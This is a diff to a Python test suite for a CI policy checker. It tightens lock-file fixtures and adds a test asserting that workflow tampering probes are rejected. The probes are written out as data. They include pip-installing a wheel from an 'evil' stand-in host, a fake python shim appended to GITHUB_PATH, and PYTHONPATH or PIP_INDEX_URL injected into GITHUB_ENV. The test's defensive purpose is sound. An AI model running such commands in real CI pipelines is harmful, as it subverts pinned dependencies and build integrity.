@@ -350,28 +350,107 @@ class PolicyTests(unittest.TestCase):
                                 (label, check_policy.check(self.root)))
                 shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
         self.assertEqual(check_policy.check(self.root), [])
+        # Fixtures are written as bytes: text-mode writes become CRLF on Windows and the lock readers are LF-strict.
         requirements = self.root / python_env.REQUIREMENTS
-        baseline = requirements.read_text()
+        baseline = python_env.read_exact(requirements)
+        six_hash = next(line for line in baseline.splitlines() if line.startswith('# wheel six-')).rsplit(':', 1)[1]
         for label, text in (('unhashed pin', baseline.replace(' \\\n    --hash=sha256:3fba0169e345c7175110351d456342c364814cfcf3b964ba4587f22915230a63', '')),
                             ('floating pin', baseline.replace('jsonschema==4.25.1', 'jsonschema>=4.25.1')),
                             ('extra package', baseline + 'requests==2.32.5 \\\n    --hash=sha256:' + 'c' * 64 + '\n'),
+                            ('extra hash without a recorded wheel', baseline.replace(
+                                f'six==1.17.0 \\\n    --hash=sha256:{six_hash}\n',
+                                f'six==1.17.0 \\\n    --hash=sha256:{six_hash} \\\n    --hash=sha256:{"d" * 64}\n')),
+                            ('previous unhashed lock', 'jsonschema==4.25.1\nPyYAML==6.0.3\nrfc3339-validator==0.1.4\nsix==1.17.0\nattrs==26.1.0\n'
+                             'jsonschema-specifications==2025.9.1\nreferencing==0.37.0\nrpds-py==2026.6.3\ntyping-extensions==4.16.0\n'),
                             ('url requirement', baseline.replace('six==1.17.0', 'six @ https://example.invalid/six-1.17.0-py2.py3-none-any.whl'))):
             with self.subTest(lock=label):
-                requirements.write_text(text)
-                self.assertTrue(check_policy.check(self.root), label)
-        requirements.write_text(baseline)
+                self.assertNotEqual(text, baseline)
+                requirements.write_bytes(text.encode('utf-8'))
+                self.assertTrue(any(python_env.REQUIREMENTS in e for e in check_policy.check(self.root)), label)
+        requirements.write_bytes(baseline.encode('utf-8'))
         version = self.root / python_env.PYTHON_VERSION_FILE
         for text in ('3.14\n', '3.14.8', '3.14.8\r\n', '3.14.x\n'):
             with self.subTest(python=text):
-                version.write_text(text)
+                version.write_bytes(text.encode('utf-8'))
                 self.assertTrue(any(python_env.PYTHON_VERSION_FILE in e for e in check_policy.check(self.root)))
-        version.write_text('3.14.8\n')
+        version.write_bytes(b'3.14.8\n')
         licensing = self.root / python_env.LICENSING
-        rows = licensing.read_text()
+        rows = python_env.read_exact(licensing)
         row = next(line for line in rows.splitlines() if line.startswith('| Python [`attrs`]'))
-        licensing.write_text(rows.replace(row + '\n', ''))
+        licensing.write_bytes(rows.replace(row + '\n', '').encode('utf-8'))
         self.assertTrue(any('attrs 26.1.0: no licensing row' in e for e in check_policy.check(self.root)))
-        licensing.write_text(rows)
+        licensing.write_bytes(rows.encode('utf-8'))
+        self.assertEqual(check_policy.check(self.root), [])
+
+    def test_closure_bypass_probes_are_rejected(self):
+        """Every probe the adversarial review found accepted must now fail, plus the re-check placement rules."""
+        import python_env
+        self.assertEqual(check_policy.check(self.root), [])
+        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
+        def index(data, run, jid='validate'): return next(i for i, s in enumerate(steps(data, jid)) if s.get('run') == run)
+        def after_install(data, run):
+            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1, {'run': run})
+        probes = (
+            'python -m pip -q install --no-deps https://example.invalid/evil.whl',
+            'python -m pip --isolated install requests',
+            'python -m pip --disable-pip-version-check install requests',
+            'python -m pip.__main__ install requests',
+            'python -c "import pip; pip.main([\'install\', \'requests\'])"',
+            'python -B -m venv "$RUNNER_TEMP/other"',
+            'python -Im venv "$RUNNER_TEMP/other"',
+            'python -I -m ensurepip',
+            'pip3 install requests', 'pipx install ruff', 'pipenv install requests', 'poetry install', 'conda install requests',
+            'uvx ruff check .', 'uv run --with requests python -c 1', 'uv add requests', 'uv pip install requests',
+            'pdm add requests', 'hatch env create', 'rye sync', 'pixi install', 'mamba install requests', 'micromamba install requests',
+            'python scripts/ci/python_env.py --path-out "$GITHUB_PATH" --venv "$RUNNER_TEMP/v2"',
+            'python  -B scripts/ci/python_env.py --venv "$RUNNER_TEMP/v2" --path-out "$GITHUB_PATH"',
+            'mkdir -p "$RUNNER_TEMP/shim" && printf \'#!/bin/sh\\nexit 0\\n\' > "$RUNNER_TEMP/shim/python" && chmod +x "$RUNNER_TEMP/shim/python" && echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"',
+            'echo "$RUNNER_TEMP/other/bin" >> "$GITHUB_PATH"',
+            'echo "PYTHONPATH=$PWD/vendor" >> "$GITHUB_ENV"',
+            'echo "PIP_INDEX_URL=https://mirror.example.invalid/simple" >> "$GITHUB_ENV"',
+            'python - <<\'PY\'\nimport os\nopen(os.environ["GITHUB_ENV"], "a").write("PYTHONPATH=vendor\\n")\nPY\n',
+        )
+        for probe in probes:
+            with self.subTest(probe=probe):
+                self.mutate('design', lambda d, probe=probe: after_install(d, probe))
+                self.assertTrue(check_policy.check(self.root), probe)
+                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')
+        def env_at(scope, key):
+            def change(data):
+                target = (data if scope == 'workflow' else data['jobs']['validate'] if scope == 'job'
+                          else steps(data)[index(data, python_env.INSTALL_COMMAND)])
+                target.setdefault('env', {})[key] = 'vendor'
+            return change
+        def second_setup(data):
+            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1,
+                               {'uses': check_policy.SETUP_PYTHON, 'with': dict(check_policy.PYTHON_SETUP)})
+        def remove_check(data): steps(data).pop(index(data, python_env.CHECK_COMMAND))
+        def early_check(data):
+            check = steps(data).pop(index(data, python_env.CHECK_COMMAND))
+            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1, check)
+        def python_after_check(data):
+            steps(data).insert(index(data, python_env.CHECK_COMMAND) + 1, {'run': 'python -c "print(1)"'})
+        def conditional_check(data): steps(data)[index(data, python_env.CHECK_COMMAND)]['if'] = 'always()'
+        def install_without_check(data):
+            steps(data)[index(data, python_env.INSTALL_COMMAND)]['run'] = python_env.INSTALL_COMMAND.replace(python_env.CHECK_COMMAND + '\n', '')
+        mutations = [('design', f'{scope} {key}', env_at(scope, key))
+                     for scope in ('workflow', 'job', 'step')
+                     for key in ('PYTHONPATH', 'PYTHONHOME', 'PIP_INDEX_URL', 'PIP_EXTRA_INDEX_URL', 'PYTHONUSERBASE')]
+        mutations += [('design', 'second setup-python after install', second_setup),
+                      ('design', 're-check removed', remove_check),
+                      ('design', 're-check before validators', early_check),
+                      ('design', 'python after re-check', python_after_check),
+                      ('design', 'conditional re-check', conditional_check),
+                      ('design', 'install without inline check', install_without_check),
+                      ('ci', 're-check removed from aggregate', lambda d: steps(d, 'ci-required').pop(index(d, python_env.CHECK_COMMAND, 'ci-required'))),
+                      ('ci', 'python between re-check and verifier', lambda d: steps(d, 'ci-required').insert(-1, {'run': 'python -c "print(1)"'})),
+                      ('copilot-code-review', 'Copilot re-check removed', lambda d: steps(d, 'copilot-setup-steps').pop(index(d, python_env.CHECK_COMMAND, 'copilot-setup-steps'))),
+                      ('copilot-code-review', 'Copilot GITHUB_PATH shim', lambda d: steps(d, 'copilot-setup-steps').append({'run': 'echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"'}))]
+        for name, label, change in mutations:
+            with self.subTest(mutation=label):
+                self.mutate(name, change)
+                self.assertTrue(check_policy.check(self.root), label)
+                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
         self.assertEqual(check_policy.check(self.root), [])
 
     def test_windows_runner_selection(self):
